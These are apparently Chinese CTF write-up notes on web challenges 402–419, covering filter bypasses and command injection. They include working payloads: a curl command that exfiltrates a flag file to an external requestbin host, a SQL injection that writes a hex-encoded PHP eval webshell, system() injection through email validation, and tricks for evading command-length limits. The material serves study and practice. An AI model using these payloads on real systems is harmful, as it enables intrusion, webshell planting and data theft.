# 其他

## web 402(parse_url过滤http)

- 用ftp代替，就是换个协议名

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676711526311-0d9528b7-51b5-49cd-a8b7-202d2d5b3ac0.png#averageHue=%23fefdfd&clientId=u3c4aa95e-20da-4&from=paste&height=202&id=u54280d33&originHeight=403&originWidth=999&originalType=binary&ratio=2&rotation=0&showTitle=false&size=43227&status=done&style=none&taskId=u6055f17d-b150-4ea3-940f-81dff65f7fb&title=&width=499.5)

## web 403(;结束命令)

### curl外带之又学一招

[http://requestbin.cn/](http://requestbin.cn/)
:::info
-d/--data <data>                  HTTP POST方式传送数据
:::

- 之前学过用burp作为服务器，现在可以用`requestbin.net`接收数据

### payload

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676713972467-4d20a26b-a582-45ed-ae32-37a0569640a9.png#averageHue=%23fefdfd&clientId=u3c4aa95e-20da-4&from=paste&height=151&id=ua049b903&originHeight=302&originWidth=1481&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36844&status=done&style=none&taskId=u4e22b444-4414-4973-bdab-f5caac831d8&title=&width=740.5)

- 这里表示`host`得是个合法ip，即`127.0.0.1`这种
- 用`;`结束前面的命令，构造一个`curl`

```shell
url=http://227.220.220.21/1.php;curl -X POST -d "flag=`cat fl0g.php`" http://requestbin.cn:80/17c2ouo1
```

- 在网站中查看结果

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676714061634-f1203ee7-05ec-4b23-8370-b16f3a228661.png#averageHue=%23fbfbfb&clientId=u3c4aa95e-20da-4&from=paste&height=448&id=u227bdaf5&originHeight=895&originWidth=1776&originalType=binary&ratio=2&rotation=0&showTitle=false&size=120875&status=done&style=none&taskId=u33dddc5e-0bb9-488d-9242-8c53ebd78e2&title=&width=888)

## web 406(sql注入之16进制)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676716798727-f19ebe31-41fb-40d7-874e-01edb353e1d5.png#averageHue=%23fefdfd&clientId=u3c4aa95e-20da-4&from=paste&height=176&id=Az20x&originHeight=351&originWidth=901&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33600&status=done&style=none&taskId=ubbe0d16d-0877-4ea5-aa7e-cd266068d9b&title=&width=450.5)

- `FILTER_VALIDATE_URL`要求得是合法的url，这个可以多测试一下，只要符合`: // /`就可以
- 猜可能links表是2列，`id`和`url`
- 用内联注释，对`<?php eval($_POST[1]);?>`进行16进制编码

```sql
url=0://1'/**/union/**/select/**/1,0x3c3f3d6576616c28245f504f53545b315d293b3f3e/**/into/**/outfile/**/"/var/www/html/2.php"%23
```

- 蚁剑连接数据库

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676717066041-fbb54504-5b3c-42ae-99e8-1f85ea6d4d8a.png#averageHue=%23efefee&clientId=u3c4aa95e-20da-4&from=paste&height=374&id=ua32d95be&originHeight=747&originWidth=1587&originalType=binary&ratio=2&rotation=0&showTitle=false&size=135120&status=done&style=none&taskId=u6982102c-a9ba-44ec-b735-577400ea72f&title=&width=793.5)

## web 407(论看文档的重要性)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676717894900-ede35d36-fc1a-4e30-bb9b-7c04f452978f.png#averageHue=%23fefefe&clientId=u3c4aa95e-20da-4&from=paste&height=215&id=u4b2f3d71&originHeight=430&originWidth=738&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33212&status=done&style=none&taskId=u308114a8-faf9-4863-a752-c4009900f0b&title=&width=369)

- php中调用静态方法可以不用实例化，直接用`cafe::add`
- 其实我测试的时候add后是需要加`()`的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676717988102-857fffe0-7858-4f4b-92bc-2fd6691357cd.png#averageHue=%23fbfbfb&clientId=u3c4aa95e-20da-4&from=paste&height=200&id=ub70b257a&originHeight=399&originWidth=1410&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51424&status=done&style=none&taskId=u306c9163-a7f5-404b-b7c2-8118ca9f83a&title=&width=705)

- 要求得是合法的ip，翻文档发现ip可以是ipv6的地址

```php
cafe::add  //这种ipv6会认为是中间省略了0，正好调用了add()方法，我只能说这是真硬凑啊
```

## web 408(filter_var)

[Wh0ale’s Blog](https://wh0ale.github.io/) p神博客<br />[https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/](https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/)
:::info
非法字符可以放在双引号里面绕过检测
:::

```php
<?php
var_dump(filter_var('is not allowed@example.com',FILTER_VALIDATE_EMAIL));
var_dump(filter_var('"is.\ not\ allowed"@example.com',FILTER_VALIDATE_EMAIL));
  ?>
```

## web 409(闭合php结束语句)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676878914446-2ead3033-6ef2-4e54-a61c-ae9164dcfbf9.png#averageHue=%23fefefd&clientId=uaa753941-d23a-4&from=paste&height=112&id=u3bae516c&originHeight=224&originWidth=749&originalType=binary&ratio=2&rotation=0&showTitle=false&size=25602&status=done&style=none&taskId=u2eba5fbc-ee60-4562-bb23-ddd342ca1b6&title=&width=374.5)

```php
email="flagsystem($_POST[1]);?>"@123.com
```

- 双引号是为了绕过`FILTER_VALIDATE_EMAIL`

## web 415(php函数名不区分大小写)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676881486132-3a70cce4-a760-44ea-9f1f-4d2c0e639b7a.png#averageHue=%23fefdfd&clientId=u867ddd79-7f5e-4&from=paste&height=160&id=u171020d8&originHeight=320&originWidth=630&originalType=binary&ratio=2&rotation=0&showTitle=false&size=24821&status=done&style=none&taskId=u361f1203-c7b8-45fd-ac63-8c9c9a62607&title=&width=315)

- 传入Getflag即可

## web 416(无需实例化调用类方法)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676882569742-869716a0-f072-4baf-831d-12a1e8f4a9a6.png#averageHue=%23fefefd&clientId=u867ddd79-7f5e-4&from=paste&height=249&id=uae943bda&originHeight=498&originWidth=736&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39610&status=done&style=none&taskId=u4dccd46d-5701-490c-99ee-d9e56c34051&title=&width=368)

- 直接用`ctf::flag`可以调用

## web 417(没看懂)

## web 418(;结束命令)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677137087545-79f9b424-a05f-497f-b430-4b00f7032de5.png#averageHue=%23fefdfc&clientId=uc985661c-6374-4&from=paste&height=271&id=ufaf6af83&originHeight=542&originWidth=759&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51056&status=done&style=none&taskId=u43b4e9e1-4625-4933-aeda-b1d337fc7bc&title=&width=379.5)

- 这里我被误导了，$key是字符串，不可能强等于`0x36d`
- 所以只能用else的语句
- 这里理解成`clear($clear)`是会执行`$clear`的命令
- post传值，用分号结束前面的命令

```php
die=0&clear=;echo `cat flag.php flag.txt`
```

## web 419(突破长度限制)

### 方法1：nl

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677138459998-0f7fc69c-ffb9-46c7-946e-052fc71577fe.png#averageHue=%23fefefd&clientId=ubdec205b-5117-4&from=paste&height=110&id=u160a5c93&originHeight=220&originWidth=374&originalType=binary&ratio=2&rotation=0&showTitle=false&size=15256&status=done&style=none&taskId=u1654ae89-802d-4304-a2e5-af40fd1909f&title=&width=187)

- 用`nl ../*`

### 方法2：突破长度限制

[挖洞经验 | 命令注入突破长度限制](https://www.sohu.com/a/208155480_354899)

#### ubuntu环境下测试(kali会有问题)

##### 命令组装

- 当在命令行输入`>echo``>hello`后，实际上相当于创建了2个文件(kali默认会在命令行中进入到这两个文件，需要`ctrl + c`退出)
- 此时再输入`*`，实际上会执行`echo hello`这个命令

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677156677080-2c1cd57a-74d1-47a9-acd3-2c4a21e94550.png#averageHue=%23212120&clientId=u1b5c8770-7e2a-4&from=paste&height=160&id=uab225e1f&originHeight=319&originWidth=773&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51999&status=done&style=none&taskId=uc685b786-b477-488f-a4f4-1f7975b595f&title=&width=386.5)
:::info
当创建的文件名有函数时，`*`会执行命令
:::
**再测试一个**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677156865744-9ffb1c0e-f165-4c71-87db-12fe944ad6be.png#averageHue=%2320201f&clientId=u1b5c8770-7e2a-4&from=paste&height=86&id=ucb291ee2&originHeight=172&originWidth=712&originalType=binary&ratio=2&rotation=0&showTitle=false&size=23825&status=done&style=none&taskId=u44578f35-0663-40e2-a067-05dcb467fea&title=&width=356)

- 也就是执行了`cat d.txt`

**组装ls -l命令**
:::info
当目录下包含`dir -l ls`这3个文件时，执行`dir -l ls a`会将`-l ls`写入`v`中，不会写`v`本身
:::

- 由于`-l`的排序会在`ls`前，所以只能倒序写入

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677157312737-b782a3b5-807a-417b-84f7-79664481dc68.png#averageHue=%23201f1f&clientId=u1b5c8770-7e2a-4&from=paste&height=83&id=ua7f4e7c0&originHeight=166&originWidth=735&originalType=binary&ratio=2&rotation=0&showTitle=false&size=27019&status=done&style=none&taskId=ud364799b-e8f8-4ce0-9b5c-865a48d8ba5&title=&width=367.5)

- 创建`sl`、`l-`、`dir`，此时`*`执行的是`dir l- sl`也就是查看目录，把`*`写入v中

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677157455421-965a2878-58ef-4cd8-a0c9-b7ca99ada91f.png#averageHue=%2320201f&clientId=u1b5c8770-7e2a-4&from=paste&height=148&id=u5cc7bc3d&originHeight=295&originWidth=754&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39945&status=done&style=none&taskId=ucf41a571-ea7f-4d43-8bf6-15610e5f4a9&title=&width=377)

##### 反转命令

- 创建`rev`，此时`*v = rev v`，即对`v`中的字符串进行翻转
- 用`sh`执行`shell`命令

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677157778923-59743333-9119-408e-b7db-d2ce49c282d9.png#averageHue=%23252524&clientId=u1b5c8770-7e2a-4&from=paste&height=222&id=u3566d89f&originHeight=443&originWidth=856&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63490&status=done&style=none&taskId=u1dd4b0b7-1209-4114-badd-5a52966d17b&title=&width=428)

- 这里的`*v`很神奇，它先寻找结尾是`v`的函数，接着寻找结尾是v的文件，我在`w`文件中写的是`t- sl`，并没有被执行

##### 控制顺序

- `ls -t`会根据文件创建的时间输出，比较省力
- <br />

##### 命令续行

- Linux中这种也是可以执行的
- `\\`在shell环境下表示命令拼接

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677159121982-ba1c4ca2-59e5-4c5a-bd7f-11972c4b0d66.png#averageHue=%23232222&clientId=u1b5c8770-7e2a-4&from=paste&height=164&id=u999b41e1&originHeight=327&originWidth=813&originalType=binary&ratio=2&rotation=0&showTitle=false&size=58228&status=done&style=none&taskId=u828193e7-9bc2-400f-b089-f0ad7a130d6&title=&width=406.5)